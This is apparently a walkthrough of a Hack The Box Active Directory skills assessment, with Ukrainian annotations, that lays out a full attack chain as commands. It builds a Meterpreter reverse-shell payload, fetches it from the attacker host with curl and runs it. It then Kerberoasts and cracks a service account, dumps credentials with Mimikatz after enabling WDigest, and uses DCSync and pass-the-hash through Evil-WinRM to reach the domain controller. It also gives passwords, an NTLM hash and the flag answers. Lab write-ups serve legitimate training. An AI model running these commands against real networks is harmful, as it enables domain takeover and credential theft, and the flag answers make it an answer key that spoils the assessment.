AD Enumeration & Attacks — Skills Assessment Part I
Environment
Domain: INLANEFREIGHT.LOCAL

DC: DC01.INLANEFREIGHT.LOCAL (172.16.6.3)

WEB server: WEB-WIN01 (10.129.x.x / 172.16.6.100)

MS01: MS01.INLANEFREIGHT.LOCAL (172.16.6.50)

Attacker (Kali): 10.10.15.221

Q1 — Initial foothold via web shell
Goal
Отримати доступ до веб‑шеллу і знайти початковий флаг.

Commands
text
# Browser
http://<HTB_IP>/uploads
# Login: admin / My_W3bsH3ll_P@ssw0rd!
(Далі — перегляд файлів у веб‑шеллі / виконання команд, щоб знайти флаг.)

Answer
text
JusT_g3tt1ng_st@rt3d!
Reverse shell to WEB‑WIN01 (Meterpreter)
Goal
Отримати стабільний доступ до WEB-WIN01 з Kali 10.10.15.221.

Commands (Kali)
bash
ip a s tun0

msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.15.221 LPORT=4444 \
  -f exe -o payload.exe

msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.15.221
set LPORT 4444
exploit

python3 -m http.server 8000
Commands (WEB‑WIN01 via web shell / PS)
powershell
curl http://10.10.15.221:8000/payload.exe `
  -O C:\Windows\System32\payload.exe

C:\Windows\System32\payload.exe
Notes
Meterpreter‑сесія під NT AUTHORITY\SYSTEM на WEB-WIN01.

Q2 — Identify SPN owner for SQL01 (Kerberoast target)
Goal
Знайти акаунт з SPN MSSQLSvc/SQL01.inlanefreight.local:1433.

Commands (WEB‑WIN01, cmd/PS)
powershell
setspn -Q */*
Фрагмент виводу:

text
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
    MSSQLSvc/SQL01.inlanefreight.local:1433
Answer
text
svc_sql
Q3 — Kerberoast svc_sql and crack password
Goal
Отримати TGS для svc_sql і зламати його пароль.

Commands (WEB‑WIN01, PowerShell)
powershell
cd C:\Windows\System32
Import-Module .\PowerView.ps1

Get-DomainUser -Identity svc_sql |
  Get-DomainSPNTicket -Format Hashcat
Скопіювати хеш $krb5tgs$23$*... у файл svcsql_tgs на Kali.

Commands (Kali / Win‑OM)
bash
hashcat -m 13100 svcsql_tgs /usr/share/wordlists/rockyou.txt
hashcat -m 13100 svcsql_tgs --show
Answer
text
lucky7
Q4 — Lateral movement to MS01 and local Administrator flag
Goal
За допомогою svc_sql / lucky7 дістатися до MS01 і прочитати Administrator\Desktop\flag.txt.

Commands (WEB‑WIN01 / будь‑який Windows з доступом у домен)
powershell
net use \\MS01\c$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
type \\MS01\c$\Users\Administrator\Desktop\flag.txt
Answer
text
spn$r0ast1ng_on@n_0p3n_f1re
Q5 — Get cleartext creds of another domain user (Mimikatz, first run)
Goal
Отримати логін нового юзера з пам’яті MS01 (через Mimikatz).

RDP port‑forward (WEB‑WIN01)
text
netsh.exe interface portproxy add v4tov4 ^
  listenport=8888 listenaddress=10.129.253.79 ^
  connectport=3389 connectaddress=172.16.6.50
RDP from Kali (10.10.15.221)
bash
xfreerdp /u:svc_sql /p:lucky7 \
  /v:10.129.253.79:8888 \
  /dynamic-resolution \
  /drive:Shared,/home/htb-ac-1224655/
Mimikatz on MS01
text
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
У виводі знаходимо нового користувача з цікавими полями → tpetty.

Answer
text
tpetty
Q6 — Enable WDigest, reboot, get cleartext password of tpetty
Goal
Увімкнути WDigest, перезавантажити MS01, знову зняти дамп і витягнути пароль tpetty.

Enable WDigest + reboot (MS01)
text
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest ^
  /v UseLogonCredential /t REG_DWORD /d 1

shutdown.exe /r /t 0 /f
RDP again (Kali → MS01)
bash
xfreerdp /u:svc_sql /p:lucky7 \
  /v:10.129.253.79:8888 \
  /dynamic-resolution \
  /drive:Shared,/home/htb-ac-1224655/
Mimikatz again (MS01)
text
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
У записі tpetty бачимо cleartext:

Sup3rS3cur3D0m@inU2eR

Answer
text
Sup3rS3cur3D0m@inU2eR
Q7 — ACL enumeration for tpetty (DCSync rights)
Goal
Подивитись, які ACL має tpetty, і підтвердити його можливість виконати DCSync.

Commands (MS01, PowerShell as domain user)
powershell
Import-Module .\PowerView.ps1

$sid = Convert-NameToSid tpetty
Get-DomainObjectACL -Identity * |
  ? { $_.SecurityIdentifier -eq $sid }
У виводі видно права Replicating Directory Changes / Replicating Directory Changes All для об’єкта домену → це дає право на DCSync.

Answer
text
DCSync
Q8 — DCSync Administrator, WinRM to DC01, Domain Admin flag
Goal
Виконати DCSync як tpetty, отримати NTLM‑хеш administrator, прокинути WinRM до DC01 і прочитати Administrator\Desktop\flag.txt.

DCSync (MS01, as tpetty)
text
runas /user:INLANEFREIGHT\tpetty powershell.exe

.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
Зберегти NTLM‑хеш, напр.:

text
27dedb1dab4d8545c6e1c66fba077da0
Metasploit autoroute to DC01 (Kali, Meterpreter on WEB‑WIN01)
text
run autoroute -s 172.16.6.3
run autoroute -p
Port scan DC01
text
use auxiliary/scanner/portscan/tcp
set rhosts 172.16.6.3
exploit
Бачимо відкритий порт 5985 (WinRM).

Port‑forward WinRM (Meterpreter)
text
portfwd add -l 6666 -p 5985 -r 172.16.6.3
Evil‑WinRM from Kali (10.10.15.221)
bash
evil-winrm -i 127.0.0.1 --port 6666 \
  -u administrator \
  -H 27dedb1dab4d8545c6e1c66fba077da0
Read flag on DC01
powershell
type C:\Users\Administrator\Desktop\flag.txt
Answer
text
r3plicat1on_m@st3r!
